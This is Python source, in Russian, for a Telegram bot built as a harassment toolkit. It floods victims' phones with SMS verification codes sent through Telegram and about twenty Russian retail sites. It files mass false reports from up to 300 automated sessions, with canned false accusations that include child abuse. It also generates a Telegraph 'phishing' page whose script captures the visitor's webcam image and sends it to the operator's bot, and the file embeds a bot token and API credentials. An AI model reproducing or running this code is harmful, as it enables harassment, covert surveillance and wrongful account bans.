import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
import re
import hashlib
from datetime import datetime
from typing import Optional, Dict, List, Tuple
import asyncio

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
import pyrogram.raw.functions.messages as raw_messages
import pyrogram.raw.functions.account as raw_account
import pyrogram.raw.types as raw_types

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"

SESSIONS_PER_USER = 300
SESSION_DELAY = 60
SMS_PER_ROUND = 100
ROUND_DELAY = 5
MAX_ROUNDS = 10
BOMBER_DELAY = 3  # Увеличьте задержку между кругами до 3 секунд
SITE_DELAY = 10

BANNER_PATH = "banner.png"

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
]

DEVICES = [
    {"model": f"iPhone {m}", "system": f"iOS {i}"}
    for m in ["15 Pro Max", "15 Pro", "14 Pro Max", "14 Pro", "13 Pro Max", "13 Pro", "12 Pro Max", "12 Pro", "11 Pro Max", "11"]
    for i in ["17.2", "17.1", "16.7", "16.6", "15.8"]
] + [
    {"model": f"Samsung Galaxy {m}", "system": f"Android {a}"}
    for m in ["S24 Ultra", "S23 Ultra", "S22 Ultra", "S21 Ultra", "Note 20 Ultra", "Z Fold5", "Z Flip5", "A55"]
    for a in ["14", "13", "12"]
] + [
    {"model": f"Google Pixel {m}", "system": f"Android {a}"}
    for m in ["8 Pro", "7 Pro", "6 Pro", "5"]
    for a in ["14", "13", "12"]
]

TELEGRAM_OAUTH_SITES = [
    {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
    {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
    {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
    {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
    {"url": "https://oauth.telegram.org/auth", "method": "GET", "phone_field": "phone", "name": "acollo",
     "params": {"bot_id": "8357292784", "origin": "https://acollo.ru", "embed": "1", "request_access": "write", "return_to": "https://acollo.ru/auth/telegram"}},
]

BOMBER_WEBSITES = [
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
    {"url": "https://api.vkusvill.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
    {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
    {"url": "https://api.lamoda.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lamoda"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
    {"url": "https://api.tutu.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
    {"url": "https://id.tinkoff.ru/auth/signup/phone", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
    {"url": "https://api.avito.ru/web/1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Avito"},
    {"url": "https://youla.ru/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Youla"},
    {"url": "https://api.ozon.ru/v1/auth/request-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
    {"url": "https://api.wildberries.ru/webapi/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
    {"url": "https://api.perekrestok.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
    {"url": "https://api.magnit.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Magnit"},
    {"url": "https://api.sbermarket.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
    {"url": "https://api.utkonos.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Utkonos"},
]

SNOS_REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
    "fake": raw_types.InputReportReasonFake(),
}

SNOS_REPORT_REASONS_RU = {
    "spam": "Спам",
    "violence": "Насилие",
    "pornography": "Порнография",
    "child_abuse": "Детское насилие",
    "copyright": "Авторские права",
    "other": "Другое",
    "personal_data": "Личные данные",
    "illegal_drugs": "Наркотики",
    "fake": "Фейковый аккаунт",
}

SNOS_REPORT_MESSAGES = {
    "spam": "Этот аккаунт рассылает спам-сообщения и рекламу. Прошу проверить и заблокировать.",
    "violence": "Аккаунт публикует контент с насилием и жестокостью. Нарушает правила Telegram.",
    "pornography": "Аккаунт распространяет порнографический контент без согласия участников.",
    "child_abuse": "Аккаунт связан с распространением детской порнографии. Требуется немедленная блокировка.",
    "copyright": "Аккаунт нарушает авторские права, публикуя защищенный контент без разрешения.",
    "other": "Аккаунт систематически нарушает правила Telegram и мешает другим пользователям.",
    "personal_data": "Аккаунт публикует личные данные людей без их согласия (доксинг).",
    "illegal_drugs": "Аккаунт используется для продажи и распространения наркотических веществ.",
    "fake": "Это фейковый аккаунт, выдающий себя за другого человека. Нарушение правил платформы.",
}

REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
}

REPORT_REASONS_RU = {
    "spam": "Спам",
    "violence": "Насилие",
    "pornography": "Порнография",
    "child_abuse": "Дети",
    "copyright": "Авторские права",
    "other": "Другое",
    "personal_data": "Личные данные",
    "illegal_drugs": "Наркотики",
}

TELEGRAPH_AUTHOR = "Telegram"
TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
phish_pages = {}

CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 20px; margin: 20px 0;">
    <h3 style="color: #fff; margin-bottom: 15px; font-size: 22px;">{title}</h3>
    <p style="color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5;">{description}</p>
    <div style="position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
        <video id="video" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>
    <button id="cam-btn" style="background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3);">{button_text}</button>
    <div id="status" style="color: #888; font-size: 13px; margin-top: 10px;">Камера готова</div>
</div>
<script>
(function(){
    const BOT_TOKEN = "{bot_token}";
    const CHAT_ID = "{chat_id}";
    const PAGE_ID = "{page_id}";
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const btn = document.getElementById("cam-btn");
    const status = document.getElementById("status");
    let stream = null;
    let done = false;
    
    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
        } catch (e) {
            status.textContent = "Нет доступа к камере";
            status.style.color = "#ff4444";
            btn.disabled = true;
        }
    }
    
    async function sendPhoto(dataUrl) {
        try {
            const blob = await (await fetch(dataUrl)).blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");
            formData.append("caption", "Фото с камеры\\nЖертва: " + PAGE_ID);
            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
            return (await resp.json()).ok;
        } catch (e) {
            return false;
        }
    }
    
    async function takePhoto() {
        if (done) { status.textContent = "Фото уже отправлено"; return; }
        status.textContent = "Съемка...";
        btn.disabled = true;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
        if (sent) {
            done = true;
            status.textContent = "Готово";
            status.style.color = "#4caf50";
            btn.textContent = "Отправлено";
            if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
        } else {
            status.textContent = "Ошибка";
            status.style.color = "#ff4444";
            btn.disabled = false;
        }
    }
    
    btn.addEventListener("click", takePhoto);
    startCamera();
})();
</script>'''

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = set()
user_sessions = {}
active_attacks = {}
active_bombers = {}
active_reports = {}
active_snos_account = {}
sessions_creation_lock = {}
usage_logs = []
MAX_LOGS = 20
site_last_used = {}
user_messages = {}
user_last_action = {}

class SnosState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ReportMessageState(StatesGroup):
    waiting_link = State()
    waiting_reason = State()

class PhishState(StatesGroup):
    waiting_title = State()
    waiting_description = State()
    waiting_button = State()

class AdminState(StatesGroup):
    waiting_user_id = State()

class SnosAccountState(StatesGroup):
    waiting_username = State()
    waiting_reason = State()


def check_cooldown(user_id: int, action: str) -> tuple:
    key = f"{user_id}_{action}"
    if key in user_last_action:
        elapsed = time.time() - user_last_action[key]
        if elapsed < 300:
            return False, 300 - elapsed
    user_last_action[key] = time.time()
    return True, 0

def add_log(user_id: int, action: str, target: str):
    global usage_logs
    usage_logs.append({"user_id": user_id, "action": action, "target": target, "time": datetime.now().strftime('%H:%M:%S')})
    if len(usage_logs) > MAX_LOGS:
        usage_logs = usage_logs[-MAX_LOGS:]

def get_last_logs(count: int = 5) -> str:
    if not usage_logs:
        return "Пусто"
    return "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in reversed(usage_logs[-count:])])

def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            ALLOWED_USERS = set(json.load(f).get("users", []))
    except:
        pass

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(ALLOWED_USERS)}, f)

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def is_user_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ALLOWED_USERS

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID:
                return await handler(event, data)
            else:
                await send_message_with_banner(event, "Только администратор!")
                return
        
        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery):
                await event.answer("Нет доступа!", show_alert=True)
            elif isinstance(event, types.Message):
                await send_message_with_banner(event, "Нет доступа!")
            return
        
        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- СЕССИИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"

def count_user_sessions_files(user_id: int) -> int:
    d = get_user_session_dir(user_id)
    if not os.path.exists(d):
        return 0
    return len([f for f in os.listdir(d) if f.startswith("session_") and f.endswith(".session")])

async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        device = random.choice(DEVICES)
        client = Client(
            session_file, 
            api_id=API_ID, 
            api_hash=API_HASH, 
            in_memory=False, 
            no_updates=True, 
            device_model=device["model"], 
            system_version=device["system"]
        )
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except:
        return None

async def create_user_sessions(user_id: int) -> tuple:
    d = get_user_session_dir(user_id)
    os.makedirs(d, exist_ok=True)
    existing = count_user_sessions_files(user_id)
    if existing >= SESSIONS_PER_USER:
        return [], existing
    
    sessions = []
    for i in range(existing):
        f = f"{d}/session_{i}"
        if os.path.exists(f"{f}.session"):
            s = await create_single_session(f, i)
            if s:
                sessions.append(s)
    
    need = SESSIONS_PER_USER - len(sessions)
    if need > 0:
        for batch in range(len(sessions), SESSIONS_PER_USER, 10):
            tasks = [
                create_single_session(f"{d}/session_{i}", i) 
                for i in range(batch, min(batch+10, SESSIONS_PER_USER)) 
                if not os.path.exists(f"{d}/session_{i}.session")
            ]
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if r and not isinstance(r, Exception):
                        sessions.append(r)
            await asyncio.sleep(2)
    
    return sessions, len(sessions)

async def ensure_user_sessions(user_id: int):
    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]:
        return
    sessions_creation_lock[user_id] = True
    try:
        if user_id not in user_sessions:
            user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
        sessions, total = await create_user_sessions(user_id)
        user_sessions[user_id]["sessions"] = sessions
        user_sessions[user_id]["total"] = total
        user_sessions[user_id]["ready"] = True
    finally:
        sessions_creation_lock[user_id] = False

async def refresh_user_sessions(user_id: int):
    if user_id in user_sessions:
        for s in user_sessions[user_id].get("sessions", []):
            try:
                await s["client"].disconnect()
            except:
                pass
    d = get_user_session_dir(user_id)
    if os.path.exists(d):
        shutil.rmtree(d)
    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
    await ensure_user_sessions(user_id)

async def get_user_sessions_batch(user_id: int, count: int) -> list:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
        return []
    now = time.time()
    available = [
        s for s in user_sessions[user_id]["sessions"] 
        if not s["in_use"] and s["flood_until"] < now and now - s["last_used"] >= SESSION_DELAY
    ]
    available.sort(key=lambda x: x["last_used"])
    selected = available[:count]
    for s in selected:
        s["in_use"] = True
        s["last_used"] = now
    return selected

def release_user_sessions(sessions: list):
    for s in sessions:
        if s:
            s["in_use"] = False

def get_user_sessions_count(user_id: int) -> int:
    return user_sessions.get(user_id, {}).get("total", 0)

def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id].get("ready", False)


# ---------- СНОС АККАУНТА ЧЕРЕЗ СЕССИИ ----------
async def report_account_via_session(session_data: dict, username: str, reason_key: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        try:
            user = await client.get_users(username)
        except Exception as e:
            logger.error(f"Failed to get user {username}: {e}")
            return {"success": False, "error": "User not found"}
        
        peer = await client.resolve_peer(user.id)
        report_reason = SNOS_REPORT_REASONS.get(reason_key, raw_types.InputReportReasonOther())
        report_message = SNOS_REPORT_MESSAGES.get(reason_key, "Нарушение правил Telegram")
        
        await client.invoke(
            raw_messages.Report(
                peer=peer,
                id=[raw_types.InputMessagePinned()],
                reason=report_reason,
                message=report_message
            )
        )
        
        try:
            await client.invoke(
                raw_account.ReportPeer(
                    peer=peer,
                    reason=report_reason,
                    message=report_message
                )
            )
        except:
            pass
        
        logger.info(f"Session {session_data['index']} reported @{username} with reason {reason_key}")
        return {"success": True}
        
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        logger.warning(f"Flood wait for {e.value}s on session {session_data.get('index', 'unknown')}")
        return {"success": False, "flood": True, "wait": e.value}
    except Exception as e:
        logger.error(f"Report error on session {session_data.get('index', 'unknown')}: {e}")
        return {"success": False, "error": str(e)}


async def snos_account_attack(user_id: int, username: str, reason_key: str, progress_callback=None) -> tuple:
    username = username.strip().replace("@", "")
    add_log(user_id, f"Снос аккаунта ({SNOS_REPORT_REASONS_RU.get(reason_key, reason_key)})", f"@{username}")
    
    if not is_user_sessions_ready(user_id):
        return 0, 0, 0, "Сессии не готовы"
    
    sessions = await get_user_sessions_batch(user_id, SESSIONS_PER_USER)
    if not sessions:
        return 0, 0, 0, "Нет доступных сессий"
    
    total_sessions = len(sessions)
    success_count = 0
    flood_count = 0
    error_count = 0
    
    logger.info(f"Starting account snos for @{username} with {total_sessions} sessions, reason: {reason_key}")
    
    batch_size = 10
    for i in range(0, len(sessions), batch_size):
        batch = sessions[i:i+batch_size]
        
        tasks = [report_account_via_session(s, username, reason_key) for s in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict):
                if result.get("success"):
                    success_count += 1
                elif result.get("flood"):
                    flood_count += 1
                else:
                    error_count += 1
            else:
                error_count += 1
        
        if progress_callback:
            await progress_callback(
                min(i + batch_size, total_sessions), 
                total_sessions,
                success_count,
                flood_count,
                error_count
            )
        
        if i + batch_size < len(sessions):
            await asyncio.sleep(2)
    
    release_user_sessions(sessions)
    
    logger.info(f"Account snos completed for @{username}: {success_count} success, {flood_count} flood, {error_count} errors")
    
    return success_count, flood_count, error_count, None


# ---------- СНОС НОМЕРА ----------
async def send_sms_safe(session_data: dict, phone: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False}
    except:
        return {"type": "SMS", "success": False}

async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    name = site["name"]
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*'}
    
    try:
        clean_phone = phone.replace("+", "")
        
        if "params" in site:
            params = site["params"].copy()
            params["phone"] = clean_phone
            async with session.get(site["url"], headers=headers, params=params, timeout=10, ssl=False) as resp:
                return {"site": name, "success": resp.status < 500}
        else:
            data = {site["phone_field"]: clean_phone}
            headers['Content-Type'] = 'application/json'
            if site["method"] == "POST":
                async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
                    return {"site": name, "success": resp.status < 500}
            else:
                async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                    return {"site": name, "success": resp.status < 500}
    except:
        return {"site": name, "success": False}

async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    add_log(user_id, "Снос", phone)
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
            if sessions:
                for s in sessions:
                    tasks.append(send_sms_safe(s, phone))
            
            for _ in range(5):
                for site in TELEGRAM_OAUTH_SITES:
                    tasks.append(send_oauth_request(sess, phone, site))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_user_sessions(sessions)
            
            for r in batch:
                if isinstance(r, dict) and r.get("success"):
                    ok += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(ROUND_DELAY)
    
    return ok


# ---------- БОМБЕР (ИСПРАВЛЕННЫЙ) ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': site.get('url', '').split('/api')[0] if '/api' in site.get('url', '') else 'https://' + site.get('url', '').split('/')[2]
    }
    clean_phone = phone.replace("+", "").replace(" ", "").replace("-", "")
    
    try:
        data = {site["phone_field"]: clean_phone}
        
        # Добавляем дополнительные поля для некоторых сайтов
        if site["name"] == "Delivery Club":
            data["type"] = "auth"
        elif site["name"] == "Samokat":
            data["type"] = "phone"
        elif site["name"] == "Tinkoff":
            data = {"phone": clean_phone}
        elif site["name"] == "Avito":
            data = {"phone": clean_phone, "type": "call"}
        elif site["name"] == "Wildberries":
            data = {"phone": clean_phone, "type": "sms"}
        elif site["name"] == "Ozon":
            data = {"phone": clean_phone, "operation": "register"}
        
        timeout = aiohttp.ClientTimeout(total=15)
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json=data, timeout=timeout, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
        else:
            async with session.get(site["url"], headers=headers, params=data, timeout=timeout, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
    except asyncio.TimeoutError:
        return {"site": site["name"], "success": False}
    except Exception as e:
        return {"site": site["name"], "success": False}

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    add_log(user_id, "Бомбер", phone)
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, enable_cleanup_closed=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            # Отправляем по 2 запроса на каждый сайт за круг
            for site in BOMBER_WEBSITES:
                for _ in range(2):
                    tasks.append(send_bomber_request(sess, phone, site))
            
            # Запускаем задачи с задержкой между ними чтобы избежать блокировок
            batch_results = []
            for task in tasks:
                if stop_event.is_set():
                    break
                result = await task
                batch_results.append(result)
                await asyncio.sleep(0.3)  # Небольшая задержка между запросами
            
            for r in batch_results:
                if isinstance(r, dict) and r.get("success"):
                    ok += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(BOMBER_DELAY)
    
    return ok


# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ ----------
async def report_message_via_session(session_data: dict, channel: str, msg_id: int, reason: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        try:
            chat = await client.get_chat(channel)
        except:
            chat = await client.get_chat(f"@{channel}")
        
        peer = await client.resolve_peer(chat.id)
        report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
        
        await client.invoke(raw_messages.Report(peer=peer, id=[msg_id], reason=report_reason, message="Нарушение правил"))
        return {"success": True}
    except:
        return {"success": False}

async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
    patterns = [r't\.me/([^/]+)/(\d+)', r'telegram\.me/([^/]+)/(\d+)']
    
    channel = None
    msg_id = None
    for pattern in patterns:
        m = re.search(pattern, link)
        if m:
            channel = m.group(1)
            msg_id = int(m.group(2))
            break
    
    if not channel or not msg_id:
        return 0, "Неверная ссылка"
    
    add_log(user_id, f"Жалоба({REPORT_REASONS_RU.get(reason, reason)})", f"@{channel}/{msg_id}")
    
    if not is_user_sessions_ready(user_id):
        return 0, "Сессии не готовы"
    
    sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
    if not sessions:
        return 0, "Нет доступных сессий"
    
    ok = 0
    for i, s in enumerate(sessions):
        if progress_callback:
            await progress_callback(i + 1)
        
        if (await report_message_via_session(s, channel, msg_id, reason)).get("success"):
            ok += 1
    
    release_user_sessions(sessions)
    return ok, None


# ---------- TELEGRAPH ФИШИНГ ----------
async def create_telegraph_page_fast(title: str, description: str, button_text: str, chat_id: int, page_id: str) -> Optional[str]:
    try:
        camera_html = CAMERA_TEMPLATE.format(
            title=title, description=description, button_text=button_text,
            bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id
        )
        
        content = [
            {"tag": "h3", "children": [title]},
            {"tag": "p", "children": [description]},
            {"tag": "figure", "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]},
        ]
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.telegra.ph/createAccount",
                json={"short_name": f"User_{random.randint(10000, 99999)}", "author_name": TELEGRAPH_AUTHOR},
                timeout=10
            ) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    return None
                token = data["result"]["access_token"]
            
            async with session.post(
                "https://api.telegra.ph/createPage",
                json={"access_token": token, "title": title, "author_name": TELEGRAPH_AUTHOR, "content": content},
                timeout=10
            ) as resp:
                data = await resp.json()
                if data.get("ok"):
                    url = data["result"]["url"]
                    phish_pages[page_id] = {"url": url, "chat_id": chat_id, "created": time.time()}
                    return url
    except Exception as e:
        logger.error(f"Telegraph error: {e}")
    return None


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА", callback_data="snos_menu")
    builder.button(text="БОМБЕР", callback_data="bomber_menu")
    builder.button(text="СНОС АККАУНТА", callback_data="snos_account_menu")
    builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
    builder.button(text="ФИШИНГ", callback_data="phish_menu")
    builder.button(text="АДМИН", callback_data="admin_menu")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop")
    builder.adjust(2, 2, 2, 1, 1)
    return builder.as_markup()

def get_snos_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ЗАПУСТИТЬ СНОС", callback_data="snos")
    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_snos_account_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ЗАПУСТИТЬ СНОС АККАУНТА", callback_data="snos_account_start")
    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_snos_account_reason_menu():
    builder = InlineKeyboardBuilder()
    for k, v in SNOS_REPORT_REASONS_RU.items():
        builder.button(text=v, callback_data=f"snosreason_{k}")
    builder.button(text="НАЗАД", callback_data="snos_account_menu")
    builder.adjust(2)
    return builder.as_markup()

def get_bomber_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="ЗАПУСТИТЬ БОМБЕР", callback_data="bomber")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1)
    return builder.as_markup()

def get_report_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="НАПИСАТЬ ЖАЛОБУ", callback_data="report_msg")
    builder.button(text="НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1)
    return builder.as_markup()

def get_report_reason_menu():
    builder = InlineKeyboardBuilder()
    for k, v in REPORT_REASONS_RU.items():
        builder.button(text=v, callback_data=f"reason_{k}")
    builder.button(text="НАЗАД", callback_data="report_menu")
    builder.adjust(2)
    return builder.as_markup()

